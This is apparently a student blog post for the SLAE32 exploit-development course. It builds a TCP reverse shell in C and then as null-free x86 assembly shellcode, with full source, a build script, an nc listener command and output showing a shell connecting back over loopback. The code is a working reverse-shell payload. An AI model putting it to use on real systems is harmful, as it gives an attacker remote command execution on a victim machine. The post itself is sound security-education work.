---
title: "SLAE32 - Assignment #2 - TCP Reverse Shell"
tags: ["slae32", "assembly", "shellcode", "exploit-development"]
---

## Introduction

This is the blog post for the 2<sup>nd</sup> Assignment of the SLAE32 course, which is offered by <a href="https://www.pentesteracademy.com/course?id=3" target="_blank">PentesterAcademy</a>. The course focuses on teaching the basics of 32-bit Assembly language for the Intel Architecture (IA-32) family of processors on the Linux platform.

The purpose of this assignment is to create a TCP Reverse Shell. A Reverse Shell has a listener running on the attacker and the target connects back to the attacker with a shell. The communication happens over the TCP protocol.

My code can be found in my Github: <a href="https://github.com/geobour98/slae32" target="_blank">geobour98's Github</a>.

## TCP Reverse Shell in C

The easiest way, in my opinion, to create a TCP Reverse Shell in `Assembly` is to first create it in `C` and then "translate" it to ASM code.

In order create the TCP Reverse Shell, a few Linux system calls (`syscalls`) will be used. They can be found in the following table:

| Syscall | Usage |
| -- | -- |
| `socket` | Creates an endpoint for communication |
| `connect` | Initializes a connection on a socket |
| `dup2` | Duplicates a file descriptor |
| `execve` | Executes a program |

Create a socket:

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
```

Initialize the connection on a socket, initializing the structure for the TCP/IP address first:

```c
struct sockaddr_in address = {
	.sin_family = AF_INET,
	.sin_port = htons(4444),
	.sin_addr = inet_addr("127.1.1.1")
};

connect(sockfd, (struct sockaddr*) &address, sizeof(address));
```

Duplicate STDIN, STDOUT and STDERR file descriptors in order to redirect everything to the socket connected:

```c
dup2(sockfd, 0);
dup2(sockfd, 1);
dup2(sockfd, 2);
```

Execute the `/bin/sh` program:

```c
execve("/bin/sh", NULL, NULL);
```

The whole `C` program is the following:

```c
// TCP Reverse Shell
// Author: geobour98

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>

int main()
{
	
	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	struct sockaddr_in address = {
		.sin_family = AF_INET,
		.sin_port = htons(4444),
		.sin_addr = inet_addr("127.1.1.1")
	};

	connect(sockfd, (struct sockaddr*) &address, sizeof(address));

	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	execve("/bin/sh", NULL, NULL);
	
	return 0;
}
```

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **Syscall Arguments**
>
> The arguments and their values for the syscalls will be explained later in the creation of the TCP Reverse Shell in Assembly.
{: .prompt-warning }
<!-- markdownlint-restore -->

In order to prove that the Reverse Shell is working we have to compile the `C` program using the GNU Compiler (`gcc`):

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ gcc reverse-c.c -o reverse-c
```

First, create a listener with `nc` on port `4444` and wait for connections:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ nc -lvnp 4444
```

Then, in another terminal execute `reverse-c`.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse-c

```

In the first terminal verify the incoming connection and run the commands `id` and `ls`.

```shell
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 35304)
id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
ls
compile.sh
reverse
reverse-c
reverse-c.c
reverse.nasm
reverse.o
reverse.py
exit
geobour98@slae32-dev:~$
```

## TCP Reverse Shell in Assembly

In order to implement the syscalls in Assembly, we have to find their defined numbers. These are located at the header file: `/usr/include/i386-linux-gnu/asm/unistd_32.h`.

The syscalls and their definitions can be found in the following table:

| Syscall | Definition |
| -- | -- |
| `socket` | `#define __NR_socket 359` |
| `connect` | `#define __NR_connect 362` |
| `dup2` | `#define __NR_dup2 63` |
| `execve` | `#define __NR_execve 11` |

Now we have to find the arguments and their values in order to be used in the syscalls.

- Syscall `socket`:

```shell
int socket(int domain, int type, int protocol);
```

The `domain` argument specifies a communication domain. Since we operate through IPv4 protocol, we will use the `AF_INET` address family, which according to the socket header file: `/usr/include/i386-linux-gnu/bits/socket.h` belongs to the `PF_INET` protocol family. This protocol family is represented by the number `2`.

The `type` argument specifies the communication semantics. We will use `SOCK_STREAM`, since it provides sequenced, reliable, two-way, connection-based byte streams. According to the socket_type header file: `/usr/include/i386-linux-gnu/bits/socket_type.h`, `SOCK_STREAM` is represented by the number `1`.

The `protocol` argument specifies a particular protocol to be used with the socket. Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case `protocol` can be specified as `0`.

The return value from `socket` is a file descriptor for the new socket, if socket was executed successfully.

- Syscall `connect`:

```shell
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```   

The `sockfd` argument is the file descriptor returned from `socket` execution. It is an integer value.

The `*addr` argument is the address structure that will be assigned to the socket. The structure consists of 3 values. The first value is the `AF_INET`, which from before is the number `2`. The second value is the port that the target will be connected to, which in our case is `4444`. The third value is the interface that the socket will connect to. We provide the value `127.1.1.1` in order to connect to the loopback interface (`127.0.0.0/8`). Note that we avoid addresses like `127.0.0.1` (that contain `0`), so we don't have nullbytes in the shellcode.

The `addrlen` argument is the size, in bytes, of the address structure pointed to by `addr`. According to the header file: `/usr/include/linux/in.h` the size is `16` bytes.

- Syscall `dup2`:

```shell
int dup2(int oldfd, int newfd);
```

The argument `oldfd` is the integer returned from `socket`.

If the descriptor `newfd` was previously open, it is silently closed before being reused. If `oldfd` is a valid file descriptor, and `newfd` has the same value as `oldfd`, then `dup2` does nothing, and returns `newfd`. We execute `dup2` 3 times in order to pass the values: `0` for `STDIN`, `1` for `STDOUT` and `2` for `STDERR`.

On success `dup2` returns the new descriptor.

- Syscall `execve`:

```shell
int execve(const char *filename, char *const argv[], char *const envp[]);
```

The `*filename` argument must be either a binary executable or a script, so we pass to it the executable "bin/sh".

The `argv` argument is an array of argument strings passed to the new program. The `envp` argument is an array of strings, conventionally of the form "key=value", which are passed as environment to the new program. Since we don't need any of these we pass the value `NULL`. 


### Assembly in Detail

Now we will examine the `Assembly` instructions in detail.

- Syscall `socket`

We first clear the register `EAX` and then pass the hexadecimal value `0x167`, which in decimal is 359. That value is passed to the `AX` part of the `EAX` register, which contains the 16 less significant bits. The decimal 359 needs 9 bits in order to be represented in binary and since we must use registers with integer size multiple to 8, we need 16 bits. If we reserved the whole `EAX` register, then nullbytes (`0x00`) would be put in the 16 more significant bits that would break our shellcode.

```nasm
	xor eax, eax
	mov ax, 0x167		; 167 is the hex value of the decimal 359 for socket
```

Then we clear the `EBX` register and pass to `BL` the value `2`, since there is the `PF_INET` protocol family.

```nasm
	xor ebx, ebx
	mov bl, 0x2		; AF_INET numeric value from PF_INET protocol family
```

After that, we clear the `ECX` register and pass to `CL` the value `1`, since this is the value of `SOCK_STREAM` constant.

```nasm
	xor ecx, ecx
	mov cl, 0x1		; SOCK_STREAM constant from socket_type.h
```

We clear the `EDX` register and the value `0`, because of the single protocol, is passed as the third argument to `socket` syscall.

```nasm
	xor edx, edx		; 0 value because of single protocol
```

Then, in order to actually execute the syscall, we run the following instruction:

```nasm
	int 0x80		; exec socket syscall
```

That instruction will be invoked after declaring the arguments of each syscall in order to be executed.

The `socket` syscall returns a file descriptor (`sockfd`), so we copy it to the `EBX` register, since the result of the syscall is saved in the `EAX` register by default.

```nasm
	mov ebx, eax		; move sockfd (file descriptor) value into ebx
```

- Syscall `connect`

We clear the `EAX` register and then pass the hexadecimal value `0x16a`, which in decimal is 362. Note that these values come from the table with the `syscalls` and their `definitions` from above.

```nasm
	xor eax, eax
	mov ax, 0x16a		; 16a is the hex value of the decimal 362 for connect
```

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **Stack vs Registers**
>
> When we use the stack, as we will for the following arguments, we push the arguments from last to first, since it is Last In First Out data structure. That’s not the case with registers, since each argument needs to be stored in a specific register.
{: .prompt-warning }
<!-- markdownlint-restore -->

We start with the values for the `address` structure.

We push the hexadecimal value `0x0101017f` to the stack, which is the address `127.1.1.1` in little endian representation, so the socket connects to the loopback interface (`127.0.0.0/8`).

```nasm
	push 0x0101017f		; connect to localhost (127.1.1.1) (little endian)
```

Then, since we are dealing with little endianness the port with decimal value `4444` and hexadecimal `115c`, becomes `5c11`.

```nasm
	push word 0x5c11	; listen on port 4444 (little endian)
```

After that, we push the value `2` for the `AF_INET` constant.

```nasm
	push word 0x2		; AF_INET constant
```

We clear the `ECX` register, and save the value of the Stack Pointer (`ESP` register) there. So now `ECX` points at the top of the stack.

```nasm
	xor ecx, ecx
	mov ecx, esp		; ecx now points at address struct at the top of the stack
```

Now the values for the struct are defined.

The `EBX` register already contains the value of `sockfd` from `socket`.

The `ECX` register already points at the beginning of the struct in the stack.

We clear the `EDX` register, and pass the hexadecimal value `0x10` (`16` in decimal), since that is the size of the address struct.

```nasm
	xor edx, edx
	mov dl, 0x10		; 10 is the decimal 16 that is the size of the address struct
```

The final step for the `connect` syscall is to invoke a syscall interrupt by the next instruction:

```nasm
	int 0x80		; exec connect syscall
```

- Syscall `dup2`

We create a loop that will execute `dup2` 3 times for `STDERR`, `STDOUT` and `STDIN` respectively. So, we clear the `ECX` register and pass the value `0x3` to `CL`, which is the counter for the loop.

```nasm
	xor ecx, ecx
	mov cl, 0x3		; set counter to 3
```

We first declare the procedure `dup2loop`, which acts like a function, where we clear the `EAX` register and pass to `AL` the hexadecimal value `0x3f` (`63` in decimal) as the `dup2` syscall number. Then, we decrement the counter (`CL`) by 1, so in the first iteration the value inside `CL` will be `2`, representing the `STDERR`. 2 more iterations will happen with value `1` and `0` for `STDOUT` and `STDIN` respectively. Each iteration is finished by executing the `dup2` syscall and by creating a conditional instruction. That instruction checks if the Zero Flag (`ZF`) is set, meaning it has value `0`, and if it is the loop is stopped and the execution is continued. If it is not `0` a `jump` happens back to `dup2loop`. In the third iteration, `CL` is decremented to `0`, so the `ZF` is set, and the execution will continue to the next instructions and there will not be a jump back to `dup2loop`.

```nasm
dup2loop:
	xor eax, eax
	mov al, 0x3f		; 3f is the hex value of the decimal 63 for dup2

	dec cl			; decrement counter by 1

	int 0x80		; exec dup2 syscall

	jnz dup2loop		; jump to loop if ZF is not zero, else continue
```

- Syscall `execve`

We clear the `EAX` register and pass the hexadecimal value `0xb` (`11` in decimal) to `AL` as the `execve` syscall number.

```nasm
	xor eax, eax
	mov al, 0xb		; b is the hex value of the decimal 11 for execve
```

Then we clear the `EDX` register. The last 2 arguments of `execve` have `NULL` values, so we push the `EDX` value to the stack twice. Also, the executable "/bin/sh" must be null terminated, so we push one more time the `EDX` value to the stack.

```nasm
	xor edx, edx
	push edx		; NULL argument
	push edx		; NULL argument
	push edx		; null terminator
```

Since "/bin/sh" is only 7 bytes, we need to make it 8 bytes. That is because when a string is pushed to the stack it must be multiplied by 4. The safest way to do that, without breaking any functionality, is to add a `/`. So the string `/bin/sh` becomes `/bin//sh`. The following string would be valid too `//bin/sh`. Since we are dealing with the stack again, the string must be reversed first. The next `python` script will help achieve that.

```python
#!/usr/bin/python

import sys

input = sys.argv[1]

print 'String length: ' + str(len(input))

stringList = [input[i:i+4] for i in range(0, len(input), 4)]

for item in stringList[::-1]:
	print item[::-1] + ' : ' + str(item[::-1].encode('hex'))
```

We run the above script by providing the string we want to be reversed.

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse.py "/bin//sh"
String length: 8
hs// : 68732f2f
nib/ : 6e69622f
```

Now the string is represented as `hex` and we can push it to the stack. So we push first the string "hs//" and then the string "nib/".

```nasm
        ; PUSH /bin//sh
        push 0x68732f2f		; "hs//"
        push 0x6e69622f		; "nib/"
```

Finally, we save `ESP` value to the `EBX` register in order to point at the top of the stack and execute the `execve` syscall.

```nasm
	mov ebx, esp		; ebx points at "/bin//sh" at the top of the stack

	int 0x80		; exec execve syscall
```

The whole `Assembly` program is the following:

```nasm
; TCP Reverse Shell
; Author: geobour98 

global _start

section .text

_start:
	; socket 
	xor eax, eax
	mov ax, 0x167		; 167 is the hex value of the decimal 359 for socket

	xor ebx, ebx
	mov bl, 0x2		; AF_INET numeric value from PF_INET protocol family

	xor ecx, ecx
	mov cl, 0x1		; SOCK_STREAM constant from socket_type.h

	xor edx, edx		; 0 value because of single protocol	

	int 0x80		; exec socket syscall 

	mov ebx, eax		; move sockfd (file descriptor) value into ebx

	; connect
	xor eax, eax
	mov ax, 0x16a		; 16a is the hex value of the decimal 362 for connect

	push 0x0101017f		; connect to localhost (127.1.1.1) (little endian)
	
	push word 0x5c11	; connect to port 4444 (little endian)
	
	push word 0x2		; AF_INET constant
	
	xor ecx, ecx
	mov ecx, esp		; ecx now points at address struct at the top of the stack
	
	xor edx, edx
	mov dl, 0x10		; 10 is the decimal 16 that is the size of the address struct

	int 0x80		; execute connect syscall

	; dup2 loop
	xor ecx, ecx		; clear ecx
	mov cl, 0x3		; set counter to 3

dup2loop:
	xor eax, eax
	mov al, 0x3f		; 3f is the hex value of the decimal 63 for dup2

	dec cl			; decrement counter by 1

	int 0x80		; exec dup2 syscall

	jnz dup2loop		; jump to loop if ZF is not zero, else continue

	; execve
	xor eax, eax
	mov al, 0xb		; b is the hex value of the decimal 11 for execve        

	xor edx, edx
	push edx		; NULL argument
	push edx		; NULL argument
	push edx		; null terminator

        ; PUSH /bin//sh
        push 0x68732f2f		; "hs//"
        push 0x6e69622f		; "nib/"

	mov ebx, esp		; ebx points at "/bin//sh" at the top of the stack

	int 0x80		; exec execve syscall
```

## Testing the Reverse Shell

In order to test Reverse Shell, we need to compile it. Compilation process consists of 2 separate processes:

- Assembling: can happen with the `nasm` assembler, which assembles the input file (`.nasm`) and directs output to the output file (`.o`) if specified. It basically "translates" the `Assembly` code.
- Linking: can happen with the GNU linker `ld`, which combines a number of object and archive files, relocates their data and ties up symbol references. It basically provides information such as where the entry point of a program is. By default the entry point is `_start` but this can be changed.

The following `bash` script automates that process:

```bash
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -felf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -o $1 $1.o

echo '[+] Done!'
```

The following command does the compilation and creates the executable `reverse`:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./compile.sh reverse
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
```

We test the Reverse Shell by creating a listener on port `4444` with `nc` in one terminal window and in another we execute the executable `reverse`. Then, back to the first we verify the incoming connection and run the commands `id` and `ls`.

1<sup>st</sup> window:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ nc -lvnp 4444
```

2<sup>nd</sup> window:

```shell
geobour98@slae32-dev:~/SLAE/custom/SLAE32/2_Shell_reverse_tcp$ ./reverse

```

1<sup>st</sup> window again:

```shell
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [127.0.0.1] port 4444 [tcp/*] accepted (family 2, sport 35306)
id
uid=1000(geobour98) gid=1000(geobour98) groups=1000(geobour98),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
ls
compile.sh
reverse
reverse-c
reverse-c.c
reverse.nasm
reverse.o
reverse.py
exit
geobour98@slae32-dev:~$
```

## Summary

We have a working TCP Reverse Shell that connects to loopback interface on port 4444 on our machine and we can execute commands after connecting.

Next will be the Egg Hunter shellcode!

<!-- markdownlint-capture -->
<!-- markdownlint-disable -->
> **SLAE32 Blog Post**
>
> This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
> 
> https://www.pentesteracademy.com/course?id=3
>
> ~~http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/~~
>
> **Student ID: PA-36167**
{: .prompt-info }
<!-- markdownlint-restore -->
